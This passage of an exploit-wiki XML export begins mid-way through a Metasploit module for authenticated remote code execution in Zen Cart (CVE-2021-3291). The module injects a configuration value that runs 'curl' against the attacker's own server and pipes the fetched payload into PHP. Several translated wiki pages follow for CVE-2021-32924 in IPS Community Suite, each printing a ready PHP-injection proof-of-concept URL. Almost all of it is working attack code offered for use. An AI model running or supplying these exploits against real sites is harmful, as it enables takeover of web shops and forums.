          'License'        =&gt; MSF_LICENSE,
          'Author'         =&gt; ['Mucahit Saratar &lt;trregen222@gmail.com&gt;'], # msf module &amp; research &amp; poc
          'References'     =&gt;[
                [ 'OSVDB', '' ],
                [ 'EDB', '' ],
                [ 'URL', 'https://github.com/MucahitSaratar/zencart_auth_rce_poc'],
                [ 'CVE', '2021-3291']
            ],
          'Platform'       =&gt; 'php',
          'Privileged'     =&gt; false,
          'Arch'           =&gt; ARCH_PHP,
          'Targets'        =&gt; [ ['Automatic', { }] ],
          'DisclosureDate' =&gt; '2021-01-22',
          'DefaultTarget'  =&gt; 0
        )
      )
      register_options(
        [
          Opt::RPORT(80),
          OptString.new('USERNAME', [ true, 'User to login with', 'admin']),
          OptString.new('PASSWORD', [ true, 'Password to login with', '']),
          OptString.new('BASEPATH', [ true, 'zencart base path eg. /zencart/', '/']),
          OptString.new('MODULE', [ true, 'Module name. eg. payment,shipping,ordertotal,plugin_manager', 'payment']),
          OptString.new('SETTING', [ true, 'setting name. eg. freecharger for payment', 'freecharger']),
          OptString.new('TARGETURI', [ true, 'Admin Panel Path', '/cracK-Fqu-trasH/'])
        ], self.class
      )
    end

    def start_server
        ssltut = false
        if datastore["SSL"]
            ssltut = true
            datastore["SSL"] = false
        end
        start_service({'Uri' =&gt; {
            'Proc' =&gt; Proc.new { |cli, req|
              on_request_uri(cli, req)
            },
            'Path' =&gt; resource_uri
        }})
        print_status("payload is on #{get_uri}")
        @adresim = get_uri
        datastore['SSL'] = true if ssltut
    end
    
    def on_request_uri(cli, request)
        print_good('First stage is executed ! Sending 2nd stage of the payload')
        send_response(cli, payload.encoded, {'Content-Type'=&gt;'text/html'})
      end

    def tabanyol
        datastore["BASEPATH"]
    end

    def isim
        datastore["USERNAME"]
    end

    def parola
        datastore["PASSWORD"]
    end


    def login
        #"index.php?cmd=login&amp;camefrom=index.php"
        res = send_request_cgi(
        'method'    =&gt; 'GET',
        'uri' =&gt; normalize_uri(tabanyol, target_uri.path, "index.php"),
        'vars_get' =&gt; {
            'cmd' =&gt; 'login',
            'camefrom' =&gt; 'index.php'
        })
        # &lt;input type="hidden" name="securityToken" value="c77815040562301dafaef1c84b7aa3f3" /&gt;
        unless res
            fail_with(Failure::Unreachable, "Access web application failure")
        end
        if res.code != 200
            fail_with(Failure::Unreachable, "we not have 200 response")
        end

        if !res.get_cookies.empty?
            @cookie = res.get_cookies
            @csrftoken = res.body.scan(/&lt;input type="hidden" name="securityToken" value="(.*)" \/&gt;/).flatten[0] || ''
            if @csrftoken.empty?
                fail_with(Failure::Unknown, 'There is no CSRF token at HTTP response.')
            end
            vprint_good("login Csrf token: "+@csrftoken)
        end

        res = send_request_cgi(
            'method' =&gt; 'POST',
            'uri' =&gt; normalize_uri(tabanyol, target_uri.path, "index.php?cmd=login&amp;camefrom=index.php"),
            'cookie' =&gt; @cookie,
            'vars_post' =&gt; {
                'securityToken' =&gt; @csrftoken,
                'action' =&gt; "do"+@csrftoken,
                'admin_name' =&gt; isim,
                'admin_pass' =&gt; parola
            })
            if res.code != 302
                fail_with(Failure::UnexpectedReply, 'There is no CSRF token at HTTP response.')
            end
            true
        end


    def check
        unless login
            fail_with(Failure::UnexpectedReply, 'Wrong credentials')
            return CheckCode::NotVulnerable('Wrong credentials')
        end
        print_good("We loged in")
        Exploit::CheckCode::Vulnerable
        CheckCode::Vulnerable('Authenticated successfully')

    end

    def exploit
        check
        start_server
        sleep(4)
        res = send_request_cgi(
            'method' =&gt; 'GET',
            'uri' =&gt; normalize_uri(tabanyol, target_uri.path, "index.php"),
            'vars_get' =&gt; {
                'cmd' =&gt; 'modules',
                'set' =&gt; datastore["MODULE"],
                'module' =&gt; datastore["SETTING"],
                'action' =&gt; 'edit'
            },
            'cookie' =&gt; @cookie
        )
        if res.code != 200
            fail_with(Failure::UnexpectedReply, 'Something Wron. code must be 200')
        end
        # &lt;input type="hidden" name="securityToken" value="09068bece11256d03ba55fd2d1f9c820" /&gt;
        if res &amp;&amp; res.code == 200
            @formtoken = res.body.scan(/&lt;input type="hidden" name="securityToken" value="(.*)" \/&gt;/).flatten[0] || ''
            if @formtoken.empty?
                fail_with(Failure::UnexpectedReply, 'securitytoken not in response')
            end
            #print_good(@formtoken)
            # &lt;form name="modules" 
            @radiolar = res.body.scan(/&lt;input type="radio" name="configuration\[(.*)\]" value="True"/)
            @selectler = res.body.scan(/&lt;select rel="dropdown" name="configuration\[(.*)\]" class="form-control"&gt;/)
            @textarr = res.body.scan(/&lt;input type="text" name="configuration\[(.*)\]" value="0" class="form-control" \/&gt;/)
            @secme = {}
            @secme["securityToken"] = @formtoken
            for @a in @radiolar
                @secme["configuration[#{@a[0]}]"] = "True','F'); echo `curl #{@adresim} |php`; //"
            end
            for @a in @selectler
                @secme["configuration[#{@a[0]}]"] = "0"
            end
            for @a in @textarr
                @secme["configuration[#{@a[0]}]"] = "0"
            end
            print_good(@secme.to_s)
            res = send_request_cgi(
                'method' =&gt; 'POST',
                'uri' =&gt; normalize_uri(tabanyol, target_uri.path, "index.php"),
                'cookie' =&gt; @cookie,
                'vars_get' =&gt; {
                    'cmd' =&gt; 'modules',
                    'set' =&gt; datastore["MODULE"],
                    'module' =&gt; datastore["SETTING"],
                    'action' =&gt; 'save'
                },
                'vars_post' =&gt; @secme
            )

            res = send_request_cgi(
                'method' =&gt; 'GET',
                'uri' =&gt; normalize_uri(tabanyol, target_uri.path, "index.php"),
                'vars_get' =&gt; {
                    'cmd' =&gt; 'modules',
                    'set' =&gt; datastore["MODULE"],
                    'module' =&gt; datastore["SETTING"],
                    'action' =&gt; 'edit'
                },
                'cookie' =&gt; @cookie
            )

        end
    end
  end
&lt;/pre&gt;</text>
      <sha1>g0viauj9mpw9j05o5sga3d13o9e0e67</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-32924 IPS Community Suite 4.5.4.2 PHP代碼注入漏洞</title>
    <ns>0</ns>
    <id>3263</id>
    <revision>
      <id>3810</id>
      <timestamp>2021-06-01T02:43:24Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages  /&gt; &lt;translate&gt; ==簡介== &lt;/translate&gt; &lt;translate&gt; IPS Community Suite versions 4.5.4.2及以下版本存在 PHP 代碼注入漏洞。 該漏洞的存在是因為&lt;..."</comment>
      <origin>3810</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="829" sha1="dvi90q3izfq7e7j3emqucv7srd72yvk" xml:space="preserve">&lt;languages  /&gt;
&lt;translate&gt;
==簡介==
&lt;/translate&gt;
&lt;translate&gt;
IPS Community Suite versions 4.5.4.2及以下版本存在 PHP 代碼注入漏洞。 該漏洞的存在是因為&lt;code&gt;IPS\cms\modules\front\pages\_builder::previewBlock()&lt;/code&gt;方法允許將任意內容傳遞給&lt;code&gt;IPS\_Theme::runProcessFunction()&lt;/code&gt;方法，該方法將用於調用&lt;code&gt;eval()&lt;/code&gt;PHP函數。 這可以被利用來注入和執行任意 PHP 代碼。 成功利用此漏洞需要具有管理側邊欄權限的帳戶（例如版主或管理員）並啟用“cms”應用程序。 
&lt;/translate&gt;

==POC==
&lt;pre&gt;
http://[host]/[ips]/index.php?app=cms&amp;module=pages&amp;controller=builder&amp;do=previewBlock&amp;block_plugin=stats&amp;block_template_use_how=copy&amp;block_plugin_app=core&amp;_sending=block_content&amp;block_content=RCE%0ACONTENT;}}phpinfo();die;/*
&lt;/pre&gt;</text>
      <sha1>dvi90q3izfq7e7j3emqucv7srd72yvk</sha1>
    </revision>
    <revision>
      <id>3811</id>
      <parentid>3810</parentid>
      <timestamp>2021-06-01T02:44:03Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>3811</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="851" sha1="ejuvywhc7c6em5bt7cv94jv490ila6f" xml:space="preserve">&lt;languages  /&gt;
&lt;translate&gt;
==簡介== &lt;!--T:1--&gt;
&lt;/translate&gt;
&lt;translate&gt;
&lt;!--T:2--&gt;
IPS Community Suite versions 4.5.4.2及以下版本存在 PHP 代碼注入漏洞。 該漏洞的存在是因為&lt;code&gt;IPS\cms\modules\front\pages\_builder::previewBlock()&lt;/code&gt;方法允許將任意內容傳遞給&lt;code&gt;IPS\_Theme::runProcessFunction()&lt;/code&gt;方法，該方法將用於調用&lt;code&gt;eval()&lt;/code&gt;PHP函數。 這可以被利用來注入和執行任意 PHP 代碼。 成功利用此漏洞需要具有管理側邊欄權限的帳戶（例如版主或管理員）並啟用“cms”應用程序。 
&lt;/translate&gt;

==POC==
&lt;pre&gt;
http://[host]/[ips]/index.php?app=cms&amp;module=pages&amp;controller=builder&amp;do=previewBlock&amp;block_plugin=stats&amp;block_template_use_how=copy&amp;block_plugin_app=core&amp;_sending=block_content&amp;block_content=RCE%0ACONTENT;}}phpinfo();die;/*
&lt;/pre&gt;</text>
      <sha1>ejuvywhc7c6em5bt7cv94jv490ila6f</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-32924 IPS Community Suite 4.5.4.2 PHP代碼注入漏洞/es</title>
    <ns>0</ns>
    <id>4077</id>
    <revision>
      <id>4694</id>
      <timestamp>2021-06-10T03:21:26Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "== Introducción =="</comment>
      <origin>4694</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="956" sha1="36eonmdl2vjm8tckwblieil42gkhzx8" xml:space="preserve">&lt;languages  /&gt;
== Introducción ==
Las versiones 4.5.4.2 y anteriores de IPS Community Suite tienen vulnerabilidades de inyección de código PHP. La vulnerabilidad existe porque el método &lt;code&gt; IPS \ cms \ modules \ front \ pages \ _builder :: previewBlock () &lt;/code&gt; permite pasar contenido arbitrario a &lt;code&gt; IPS \ _Theme :: runProcessFunction () &lt;/ code &gt; Método, este método se utilizará para llamar a la función PHP &lt;code&gt; eval () &lt;/code&gt;. Esto se puede utilizar para inyectar y ejecutar código PHP arbitrario. La explotación exitosa de esta vulnerabilidad requiere una cuenta (como un moderador o administrador) con permisos para administrar la barra lateral y habilitar la aplicación "cms". 

==POC==
&lt;pre&gt;
http://[host]/[ips]/index.php?app=cms&amp;module=pages&amp;controller=builder&amp;do=previewBlock&amp;block_plugin=stats&amp;block_template_use_how=copy&amp;block_plugin_app=core&amp;_sending=block_content&amp;block_content=RCE%0ACONTENT;}}phpinfo();die;/*
&lt;/pre&gt;</text>
      <sha1>36eonmdl2vjm8tckwblieil42gkhzx8</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-32924 IPS Community Suite 4.5.4.2 PHP代碼注入漏洞/pt</title>
    <ns>0</ns>
    <id>4084</id>
    <revision>
      <id>4701</id>
      <timestamp>2021-06-10T03:47:31Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "Vulnerabilidade de injeção de código PHP CVE-2021-32924 IPS Community Suite 4.5.4.2"</comment>
      <origin>4701</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="961" sha1="j9xgmb4bmsap5irz2ht7q2r31w3e5v9" xml:space="preserve">&lt;languages  /&gt;
== Introdução ==
As versões 4.5.4.2 e inferiores do IPS Community Suite apresentam vulnerabilidades de injeção de código PHP. A vulnerabilidade existe porque o método &lt;code&gt; IPS \ cms \ modules \ front \ pages \ _builder :: previewBlock () &lt;/code&gt; permite que conteúdo arbitrário seja passado para &lt;code&gt; IPS \ _Theme :: runProcessFunction () &lt;/ code &gt; Método, este método será usado para chamar a função PHP &lt;code&gt; eval () &lt;/code&gt;. Isso pode ser usado para injetar e executar código PHP arbitrário. A exploração bem-sucedida desta vulnerabilidade requer uma conta (como um moderador ou administrador) com permissões para gerenciar a barra lateral e habilitar o aplicativo "cms". 

==POC==
&lt;pre&gt;
http://[host]/[ips]/index.php?app=cms&amp;module=pages&amp;controller=builder&amp;do=previewBlock&amp;block_plugin=stats&amp;block_template_use_how=copy&amp;block_plugin_app=core&amp;_sending=block_content&amp;block_content=RCE%0ACONTENT;}}phpinfo();die;/*
&lt;/pre&gt;</text>
      <sha1>j9xgmb4bmsap5irz2ht7q2r31w3e5v9</sha1>
    </revision>
  </page>
</mediawiki>
